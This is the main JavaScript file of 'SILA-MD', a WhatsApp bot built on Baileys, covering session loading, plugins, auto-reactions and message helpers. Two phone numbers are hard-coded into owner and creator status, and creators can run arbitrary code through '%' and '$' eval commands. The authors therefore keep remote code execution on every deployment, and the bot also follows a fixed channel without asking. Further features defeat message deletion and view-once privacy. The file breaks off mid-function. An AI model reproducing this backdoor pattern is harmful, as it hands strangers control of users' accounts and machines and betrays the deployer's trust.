console.clear()
console.log("📳 Starting SILA-MD...")

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => {
  console.error("❌ Uncaught Exception:", err)
})
process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ Unhandled Rejection:", reason)
})

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, 
        fkontak, getContextInfo, sendButtonMessage, sendTemplateButton, sendListMessage, createButtons } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX || '.'

// ============ OWNER CONFIGURATION ============
const ownerNumber = ['255768978061', '255789661031']
const configOwner = config.OWNER_NUMBER ? config.OWNER_NUMBER.split(',').map(num => num.trim()) : []
const allOwnerNumbers = [...new Set([...ownerNumber, ...configOwner])]

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) throw err
      })
    }
  })
}

setInterval(clearTempDir, 5 * 60 * 1000)

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

let conn = null
let store = null  // Initialize store

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID || config.SESSION_ID.trim() === '') {
    console.log('❌ Please add your session to SESSION_ID in config.env or config.js')
    process.exit(1)
  }
  const sessdata = config.SESSION_ID.replace("sila~", '').trim()
  if (!sessdata) {
    console.log('❌ SESSION_ID is empty after processing')
    process.exit(1)
  }
  console.log('📥 Downloading session file...')
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
  filer.download((err, data) => {
    if (err) {
      console.log('❌ Failed to download session:', err.message)
      process.exit(1)
    }
    fs.writeFile(__dirname + '/sessions/creds.json', data, (writeErr) => {
      if (writeErr) {
        console.log('❌ Failed to save session:', writeErr.message)
        process.exit(1)
      }
      console.log("✅ Session downloaded successfully")
      console.log("🔄 Restarting bot with new session...")
      process.exit(0)
    })
  })
}

// Function to get the current date and time in Tanzania
function getCurrentDateTimeParts() {
    const options = {
        timeZone: 'Africa/Nairobi',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false,
    };
    const formatter = new Intl.DateTimeFormat('en-KE', options);
    const parts = formatter.formatToParts(new Date());

    let date = '', time = '';

    parts.forEach(part => {
        if (part.type === 'day' || part.type === 'month' || part.type === 'year') {
            date += part.value;
            if (part.type !== 'year') date += '/';
        }
        if (part.type === 'hour' || part.type === 'minute' || part.type === 'second') {
            time += part.value;
            if (part.type !== 'second') time += ':';
        }
    });

    return { date, time };
}

//=============================================
async function connectToWA() {
  try {
    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")

    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    const { version } = await fetchLatestBaileysVersion()

    conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    // ============ INITIALIZE STORE ============
    store = makeInMemoryStore({ 
      logger: P({ level: 'silent' }).child({ 
        module: 'store' 
      }) 
    })
    store.bind(conn.ev)

    // ============ ADD BUTTON HELPER FUNCTIONS TO conn ============
    conn.sendButton = async (jid, text, buttons, footer = '', options = {}) => {
      return await sendButtonMessage(conn, jid, text, buttons, footer, options);
    };
    
    conn.sendTemplateButton = async (jid, text, footer, buttons, options = {}) => {
      return await sendTemplateButton(conn, jid, text, footer, buttons, options);
    };
    
    conn.sendList = async (jid, text, footer, title, buttonText, sections, options = {}) => {
      return await sendListMessage(conn, jid, text, footer, title, buttonText, sections, options);
    };
    
    conn.fkontak = fkontak;
    conn.getContextInfo = (m, ownerName = config.OWNER_NAME || 'Owner', ownerNumber = config.OWNER_NUMBER || '255*********') => {
      return getContextInfo(m, ownerName, ownerNumber);
    };
    
    conn.createButtons = (buttons) => {
      return createButtons(buttons);
    };
    // ============================================================

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        console.log('[ ⚠️ ] Connection closed:', lastDisconnect?.error?.output?.statusCode)
        
        if (shouldReconnect) {
          console.log('[ ♻️ ] Attempting to reconnect...')
          setTimeout(() => connectToWA(), 5000)
        } else {
          console.log('[ ❌ ] Logged out. Please update your SESSION_ID')
        }
      } else if (connection === 'open') {
        try {
          console.log('[ ❤️ ] Installing Plugins')

          // Read plugins directory
          const pluginFiles = fs.readdirSync("./plugins/")
          for (const plugin of pluginFiles) {
            if (path.extname(plugin).toLowerCase() === ".js") {
              try {
                require("./plugins/" + plugin)
                console.log(`✅ Loaded plugin: ${plugin}`)
              } catch (pluginError) {
                console.error(`❌ Error loading plugin ${plugin}:`, pluginError.message)
              }
            }
          }

          console.log('[ ✔ ] Plugins installed successfully ✅')
          console.log('[ 🪀 ] Bot connected to WhatsApp 📲')

          let up = `┏━❑ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐈𝐋𝐀-𝐌𝐃 ━━━━━━━━━━━
┃ 🔹 Your bot is now active & ready!
┃ 🔹 Enjoy smart, seamless chats
┃ 🔹 Current prefix: ${prefix}
┗━━━━━━━━━━━━━━━━━
┏━❑ SUPPORT PROJECT ━━━━━━━━━
┃ ⭐ Star | 🔄 Fork | 📢 Share
┃ 🔗 GitHub: https://github.com/Sila-Md/SILA-MD
┗━━━━━━━━━━━━━━━━━━━━━━━━

> © 𝐒𝐈𝐋𝐀 𝐌𝐃 | Crafted with precision`;
          
          try {
            await conn.sendMessage(conn.user.id, { 
              image: { url: `https://files.catbox.moe/36vahk.png` }, 
              caption: up 
            })
          } catch (sendError) {
            console.error("❌ Error sending welcome message:", sendError.message)
          }

          const channelJid = "120363402325089913@newsletter"
          try {
            await conn.newsletterFollow(channelJid)
            console.log(`✅ Successfully followed channel: ${channelJid}`)
          } catch (error) {
            console.error(`❌ Failed to follow channel: ${error.message}`)
          }

        } catch (error) {
          console.error("[ ❌ ] Error during post-connect setup:", error)
        }
      }
    })

    conn.ev.on('creds.update', saveCreds)

    // ============ AUTO BIO UPDATE ============
    setInterval(async () => {
        if (config.AUTO_BIO === "true" && conn) {
            const { date, time } = getCurrentDateTimeParts();
            const bioText = `𝚈𝚘𝚞𝚛 𝚋𝚘𝚝 𝚒𝚜 𝚗𝚘𝚠 𝚊𝚌𝚝𝚒𝚟𝚎 & 𝚛𝚎𝚊𝚍𝚢`;
            try {
                await conn.setStatus(bioText);
                console.log(`✅ Updated Bio: ${bioText}`);
            } catch (err) {
                console.error("❌ Failed to update Bio:", err.message);
            }
        }
    }, 60000);

    // ============ MESSAGES.UPDATE (ANTI DELETE) ============
    conn.ev.on('messages.update', async updates => {
      try {
        for (const update of updates) {
          if (update.update.message === null) {
            console.log("🗑️ Delete Detected")
            await AntiDelete(conn, updates)
          }
        }
      } catch (error) {
        console.error("❌ Error in messages.update:", error.message)
      }
    });

    // ============ GROUP PARTICIPANTS UPDATE ============
    conn.ev.on("group-participants.update", (update) => {
      try {
        GroupEvents(conn, update)
      } catch (error) {
        console.error("❌ Error in group-participants.update:", error.message)
      }
    });	  
	  
    // ============ MESSAGES.UPSERT (MAIN HANDLER) ============
    conn.ev.on('messages.upsert', async(mek) => {
      try {
        mek = mek.messages[0]
        if (!mek.message) return
        
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;
        
        if (config.READ_MESSAGE === 'true' && conn) {
          await conn.readMessages([mek.key]);
        }
        
        if(mek.message.viewOnceMessageV2)
          mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true" && conn){
          await conn.readMessages([mek.key])
        }
        
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true" && conn){
          const ravlike = await conn.decodeJid(conn.user.id);
          const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
          await conn.sendMessage(mek.key.remoteJid, {
            react: {
              text: randomEmoji,
              key: mek.key,
            } 
          }, { statusJidList: [mek.key.participant, ravlike] });
        }                       
        
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true" && conn){
          const user = mek.key.participant
          const text = `${config.AUTO_STATUS_MSG}`
          await conn.sendMessage(user, { text: text }, { quoted: mek })
        }
        
        await Promise.all([
          saveMessage(mek),
        ]);
        
        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const from = mek.key.remoteJid
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : 
                     (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : 
                     (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : 
                     (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        
        const isCmd = body.startsWith(prefix)
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        
        // ============ FIXED GROUP AND ADMIN DETECTION ============
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const pushname = mek.pushName || 'User'
        const isMe = botNumber.includes(senderNumber)
        
        // FIXED: Owner detection
        const isOwner = allOwnerNumbers.includes(senderNumber) || isMe
        
        // FIXED: Group metadata with error handling
        let groupMetadata = null
        let groupName = ''
        let participants = []
        let groupAdmins = []
        let isBotAdmins = false
        let isAdmins = false
        
        if (isGroup) {
          try {
            groupMetadata = await conn.groupMetadata(from)
            groupName = groupMetadata.subject || ''
            participants = groupMetadata.participants || []
            
            // FIXED: Admin detection
            groupAdmins = participants
              .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
              .map(p => p.id)
            
            isBotAdmins = groupAdmins.includes(botNumber2)
            isAdmins = groupAdmins.includes(sender)
            
          } catch (error) {
            console.error(`❌ Error getting group metadata:`, error.message)
          }
        }
        
        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
          conn.sendMessage(from, { text: teks }, { quoted: mek })
        }
        
        const udp = botNumber.split('@')[0];
        let isCreator = [udp, ...ownerNumber, ...configOwner]
          .map(v => v && v.replace ? v.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)
          .filter(v => v)
          .includes(sender);
      
        // ============ EVAL COMMANDS FOR CREATOR ============
        if (isCreator && mek.text && mek.text.startsWith('%')) {
          let code = budy.slice(2);
          if (!code) {
            reply(`┏━[ 𝗘𝗩𝗔𝗟 𝗠𝗢𝗗𝗘 ]━❍
┃ ⌬ Provide me with a query to run Master!
┗━━━━━━━━━━━━━━━━━━❍`);
            return;
          }
          try {
            let resultTest = eval(code);
            if (typeof resultTest === 'object')
              reply(util.format(resultTest));
            else reply(util.format(resultTest));
          } catch (err) {
            reply(`┏━[ 𝗘𝗩𝗔𝗟 𝗘𝗥𝗥𝗢𝗥 ]━❍
┃ ⌬ ${util.format(err)}
┗━━━━━━━━━━━━━━━━━━❍`);
          }
          return;
        }
        
        if (isCreator && mek.text && mek.text.startsWith('$')) {
          let code = budy.slice(2);
          if (!code) {
            reply(`┏━[ 𝗔𝗦𝗬𝗡𝗖 𝗘𝗩𝗔𝗟 ]━❍
┃ ⌬ Provide me with a query to run Master!
┗━━━━━━━━━━━━━━━━━━❍`);
            return;
          }
          try {
            let resultTest = await eval('(async()=>{\n' + code + '\n})()');
            let h = util.format(resultTest);
            if (h === undefined) return console.log('error');
            else reply(h);
          } catch (err) {
            if (err === undefined)
              return console.log('error');
            else reply(util.format(err));
          }
          return;
        }
        
        // ============ OWNER REACT ============
        if (allOwnerNumbers.includes(senderNumber) && !isReact && config.OWNER_REACT === "true") {
          const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        }
      
        // ============ PUBLIC REACT ============//
        if (!isReact && config.AUTO_REACT === 'true') {
          const reactions = [
              '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
              '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
              '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
              '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
              '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
              '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
              '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
              '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
              '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
              '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
              '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
              '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
              '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
              '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
              '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
          ];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        }
                
        // ============ CUSTOM REACT ============//      
        if (!isReact && config.CUSTOM_REACT === 'true') {
          const reactions = (config.CUSTOM_REACT_EMOJIS || '🙂,😔').split(',');
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        }
              
        // ============ WORK TYPE ============ 
        if(!isOwner && config.MODE === "private") return
        if(!isOwner && isGroup && config.MODE === "inbox") return
        if(!isOwner && !isGroup && config.MODE === "groups") return
         
        // ============ COMMANDS EXECUTION ============ 
        const events = require('./command')
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        
        if (isCmd) {
          const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || 
                      events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
          if (cmd) {
            if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
            
            try {
              cmd.function(conn, mek, m, {
                from, quoted, body, isCmd, command, args, q, text, 
                isGroup, sender, senderNumber, botNumber2, botNumber, 
                pushname, isMe, isOwner, isCreator, groupMetadata, groupName, 
                participants, groupAdmins, isBotAdmins, isAdmins, reply
              });
            } catch (e) {
              console.error(`❌ Plugin Error [${command}]: ${e.message}`);
            }
          }
        }
        
        for (const command of events.commands) {
          try {
            if (body && command.on === "body") {
              command.function(conn, mek, m, {
                from, l, quoted, body, isCmd, command, args, q, text, 
                isGroup, sender, senderNumber, botNumber2, botNumber, 
                pushname, isMe, isOwner, isCreator, groupMetadata, groupName, 
                participants, groupAdmins, isBotAdmins, isAdmins, reply
              })
            } else if (mek.q && command.on === "text") {
              command.function(conn, mek, m, {
                from, l, quoted, body, isCmd, command, args, q, text, 
                isGroup, sender, senderNumber, botNumber2, botNumber, 
                pushname, isMe, isOwner, isCreator, groupMetadata, groupName, 
                participants, groupAdmins, isBotAdmins, isAdmins, reply
              })
            } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
              command.function(conn, mek, m, {
                from, l, quoted, body, isCmd, command, args, q, text, 
                isGroup, sender, senderNumber, botNumber2, botNumber, 
                pushname, isMe, isOwner, isCreator, groupMetadata, groupName, 
                participants, groupAdmins, isBotAdmins, isAdmins, reply
              })
            } else if (command.on === "sticker" && mek.type === "stickerMessage") {
              command.function(conn, mek, m, {
                from, l, quoted, body, isCmd, command, args, q, text, 
                isGroup, sender, senderNumber, botNumber2, botNumber, 
                pushname, isMe, isOwner, isCreator, groupMetadata, groupName, 
                participants, groupAdmins, isBotAdmins, isAdmins, reply
              })
            }
          } catch (cmdError) {
            console.error("❌ Error executing command:", cmdError.message)
          }
        }
        
      } catch (error) {
        console.error("❌ Fatal error in messages.upsert:", error.message)
      }
    }); // <-- End of messages.upsert

    // ============ ADD ALL THE HELPER FUNCTIONS ============
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      try {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = {
                ...message.message.viewOnceMessage.message
            }
        }
        
        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
      } catch (error) {
        console.error("Error in copyNForward:", error.message)
        return null
      }
    }

    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      try {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
      } catch (error) {
        console.error("Error in downloadAndSaveMediaMessage:", error.message)
        return null
      }
    }

    conn.downloadMediaMessage = async(message) => {
      try {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
      } catch (error) {
        console.error("Error in downloadMediaMessage:", error.message)
        return null
      }
    }

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      try {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        if (mime.split("/")[1] === "gif") {
          return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
          return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
          return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
          return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
          return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
      } catch (error) {
        console.error("Error in sendFileUrl:", error.message)
        return null
      }
    }

    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      try {
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id
      
        return proto.WebMessageInfo.fromObject(copy)
      } catch (error) {
        console.error("Error in cMod:", error.message)
        return copy
      }
    }

    conn.getFile = async(PATH, save) => {
      try {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        let filename = path.join(__dirname, 'temp', new Date() * 1 + '.' + type.ext)
        if (!fs.existsSync(path.join(__dirname, 'temp'))) {
          fs.mkdirSync(path.join(__dirname, 'temp'))
        }
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
            size: Buffer.byteLength(data),
            ...type,
            data
        }
      } catch (error) {
        console.error("Error in getFile:", error.message)
        return null
      }
    }

    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      try {
        let types = await conn.getFile(PATH, true)
        if (!types) return null
        
        let { filename, size, ext, mime, data } = types
        let type = '',
            mimetype = mime,
            pathFile = filename
        if (options.asDocument) type = 'document'
        else if (/image/.test(mime)) type = 'image'
        else if (/video/.test(mime)) type = 'video'
        else if (/audio/.test(mime)) type = 'audio'
        else type = 'document'
        
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            mimetype,
            fileName,
            ...options
        }, { quoted, ...options })
        
        // Clean up temp file
        if (fs.existsSync(pathFile)) {
          fs.unlinkSync(pathFile)
        }
        return true
      } catch (error) {
        console.error("Error in sendFile:", error.message)
        return null
      }
    }

    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }

    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
      try {
        return conn.sendMessage(jid, { 
          text: text, 
          contextInfo: { 
            mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
          }, 
          ...options 
        }, { quoted })
      } catch (error) {
        console.error("Error in sendTextWithMentions:", error.message)
        return null
      }
    }

    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      try {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
      } catch (error) {
        console.error("Error in sendImage:", error.message)
        return null
      }
    }

    conn.sendText = (jid, text, quoted = '', options) => {
      try {
        return conn.sendMessage(jid, { text: text, ...options }, { quoted })
      } catch (error) {
        console.error("Error in sendText:", error.message)
        return null
      }
    }

    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      try {
        let buttonMessage = {
                text,
                footer,
                buttons,
                headerType: 2,
                ...options
            }
        return conn.sendMessage(jid, buttonMessage, { quoted, ...options })
      } catch (error) {
        console.error("Error in sendButtonText:", error.message)
        return null
      }
    }

    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      try {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": text,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options)
        return conn.relayMessage(jid, template.message, { messageId: template.key.id })
      } catch (error) {
        console.error("Error in send5ButImg:", error.message)
        return null
      }
    }

    conn.getName = (jid, withoutContact = false) => {
      try {
        let id = conn.decodeJid(jid);
        withoutContact = conn.withoutContact || withoutContact;
        let v;
        if (id.endsWith('@g.us')) {
          return new Promise(async resolve => {
              v = store?.contacts[id] || {};
              if (!(v.name?.notify || v.subject))
                  v = await conn.groupMetadata(id).catch(() => ({})) || {};
              resolve(
                  v.name ||
                      v.subject ||
                      id.split('@')[0]
              );
          });
        } else {
          v =
              id === '0@s.whatsapp.net'
                  ? { id, name: 'WhatsApp' }
                  : id === conn.decodeJid(conn.user.id)
                  ? conn.user
                  : store?.contacts[id] || {};
          return (
              (withoutContact ? '' : v.name) ||
              v.subject ||
              v.verifiedName ||
              id.split('@')[0]
          );
        }
      } catch (error) {
        console.error("Error in getName:", error.message)
        return jid.split('@')[0]
      }
    };

    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
      try {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${i}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nEND:VCARD`,
            });
        }
        return conn.sendMessage(
            jid,
            {
                contacts: {
                    displayName: `${list.length} Contact`,
                    contacts: list,
                },
                ...opts,
            },
            { quoted },
        );
      } catch (error) {
        console.error("Error in sendContact:", error.message)
        return null
      }
    };

    conn.setStatus = status => {
      try {
        conn.query({
            tag: 'iq',
            attrs: {
                to: '@s.whatsapp.net',
                type: 'set',
                xmlns: 'status',
            },
            content: [
                {
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8'),
                },
            ],
        });
        return status;
      } catch (error) {
        console.error("Error in setStatus:", error.message)
        return null
      }
    };
      
